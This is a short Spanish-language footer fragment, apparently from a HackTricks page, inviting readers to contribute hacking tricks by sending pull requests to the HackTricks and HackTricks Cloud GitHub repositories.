* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>